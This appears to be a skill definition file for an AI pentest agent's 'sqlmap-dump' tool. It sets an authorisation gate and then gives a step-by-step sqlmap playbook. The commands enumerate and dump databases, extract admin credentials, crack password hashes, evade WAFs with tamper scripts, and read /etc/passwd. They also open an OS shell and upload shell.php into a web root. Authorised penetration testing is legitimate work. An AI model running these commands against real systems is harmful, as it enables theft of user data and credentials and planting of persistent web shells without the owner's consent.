---
name: sqlmap-dump
display_name: SQLMap Dump
version: 1.0.0
risk_level: critical
category: vuln_scan
external_binary: python3
network_egress: required
expected_runtime_sec: 1200
summary_size_hint: medium
---

**Critical-risk**: Actually extract data from a confirmed-vulnerable
database via `sqlmap --batch --dbs` / `--tables` / `--columns` / `--dump`.
Gated by `HighRiskGate.guard` — the LLM must have explicit user
authorisation for this target and a prior `sqlmap-detect` confirming
injection. Caller chooses the scope (`dbs` → `tables` → `columns` → `dump`)
via the `action` parameter; each step dumps into `<scan_dir>/sqlmap/` and
records findings.

### Database Enumeration Progression

| Stage          | Command                                                    |
| -------------- | ---------------------------------------------------------- |
| List Databases | `sqlmap -u "URL" --dbs --batch`                            |
| List Tables    | `sqlmap -u "URL" -D dbname --tables --batch`               |
| List Columns   | `sqlmap -u "URL" -D dbname -T tablename --columns --batch` |
| Dump Data      | `sqlmap -u "URL" -D dbname -T tablename --dump --batch`    |
| Dump All       | `sqlmap -u "URL" -D dbname --dump-all --batch`             |
## Examples

### Example 1: Complete Database Enumeration

```bash
# Step 1: Discover databases
sqlmap -u "http://testphp.vulnweb.com/artists.php?artist=1" --dbs --batch
# Result: acuart database found

# Step 2: List tables
sqlmap -u "http://testphp.vulnweb.com/artists.php?artist=1" -D acuart --tables --batch
# Result: users, products, carts, etc.

# Step 3: List columns
sqlmap -u "http://testphp.vulnweb.com/artists.php?artist=1" -D acuart -T users --columns --batch
# Result: username, password, email columns

# Step 4: Dump user credentials
sqlmap -u "http://testphp.vulnweb.com/artists.php?artist=1" -D acuart -T users --dump --batch
```

### Example 2: POST Request Injection

```bash
# Save Burp request to file (login.txt):
# POST /login.php HTTP/1.1
# Host: target.com
# Content-Type: application/x-www-form-urlencoded
# 
# username=admin&password=test

# Run SQLMap with request file
sqlmap -r /root/Desktop/login.txt -p username --dbs --batch
```

### Example 3: Bulk Target Scanning

```bash
# Create bulkfile.txt:
echo "http://192.168.1.10/sqli/Less-1/?id=1" > bulkfile.txt
echo "http://192.168.1.10/sqli/Less-2/?id=1" >> bulkfile.txt

# Scan all targets
sqlmap -m bulkfile.txt --dbs --batch
```

### Example 4: Aggressive Testing

```bash
# High level and risk for thorough testing
sqlmap -u "http://target.com/page.php?id=1" --dbs --batch --level=5 --risk=3

# Specify all techniques
sqlmap -u "http://target.com/page.php?id=1" --dbs --batch --technique=BEUSTQ
```

### Example 5: Extract Specific Credentials

```bash
# Target specific columns
sqlmap -u "http://target.com/page.php?id=1" \
  -D webapp \
  -T admin_users \
  -C admin_name,admin_pass,admin_email \
  --dump --batch

# Automatically crack password hashes
sqlmap -u "http://target.com/page.php?id=1" \
  -D webapp \
  -T users \
  --dump --batch \
  --passwords
```

### Example 6: OS Shell Access (Advanced)

```bash
# Get interactive OS shell (requires DBA privileges)
sqlmap -u "http://target.com/page.php?id=1" --os-shell --batch

# Execute specific OS command
sqlmap -u "http://target.com/page.php?id=1" --os-cmd="whoami" --batch

# File read from server
sqlmap -u "http://target.com/page.php?id=1" --file-read="/etc/passwd" --batch

# File upload to server
sqlmap -u "http://target.com/page.php?id=1" --file-write="/local/shell.php" --file-dest="/var/www/html/shell.php" --batch
```

## Troubleshooting

### Issue: "Parameter does not seem injectable"

**Cause**: SQLMap cannot find injection point
**Solution**:

```bash
# Increase testing level and risk
sqlmap -u "URL" --dbs --batch --level=5 --risk=3

# Specify parameter explicitly
sqlmap -u "URL" -p "id" --dbs --batch

# Try different injection techniques
sqlmap -u "URL" --dbs --batch --technique=BT

# Add prefix/suffix for filter bypass
sqlmap -u "URL" --dbs --batch --prefix="'" --suffix="-- -"
```

### Issue: Target Behind WAF/Firewall

**Cause**: Web Application Firewall blocking requests
**Solution**:

```bash
# Use tamper scripts
sqlmap -u "URL" --dbs --batch --tamper=space2comment

# List available tamper scripts
sqlmap --list-tampers

# Common tamper combinations
sqlmap -u "URL" --dbs --batch --tamper=space2comment,between,randomcase

# Add delay between requests
sqlmap -u "URL" --dbs --batch --delay=2

# Use random User-Agent
sqlmap -u "URL" --dbs --batch --random-agent
```

### Issue: Connection Timeout

**Cause**: Network issues or slow target
**Solution**:

```bash
# Increase timeout
sqlmap -u "URL" --dbs --batch --timeout=60

# Reduce threads
sqlmap -u "URL" --dbs --batch --threads=1

# Add retries
sqlmap -u "URL" --dbs --batch --retries=5
```

### Issue: Time-Based Attacks Too Slow

**Cause**: Default time delay too conservative
**Solution**:

```bash
# Reduce time delay (risky, may cause false negatives)
sqlmap -u "URL" --dbs --batch --time-sec=3

# Use boolean-based instead if possible
sqlmap -u "URL" --dbs --batch --technique=B
```

### Issue: Cannot Dump Large Tables

**Cause**: Table has too many records
**Solution**:

```bash
# Limit number of records
sqlmap -u "URL" -D db -T table --dump --batch --start=1 --stop=100

# Dump specific columns only
sqlmap -u "URL" -D db -T table -C username,password --dump --batch

# Exclude specific columns
sqlmap -u "URL" -D db -T table --dump --batch --exclude-sysdbs
```

### Issue: Session Drops During Long Scan

**Cause**: Session timeout or connection reset
**Solution**:

```bash
# Save and resume session
sqlmap -u "URL" --dbs --batch --output-dir=/root/sqlmap_session

# Resume from saved session
sqlmap -u "URL" --dbs --batch --resume

# Use persistent HTTP connection
sqlmap -u "URL" --dbs --batch --keep-alive
```

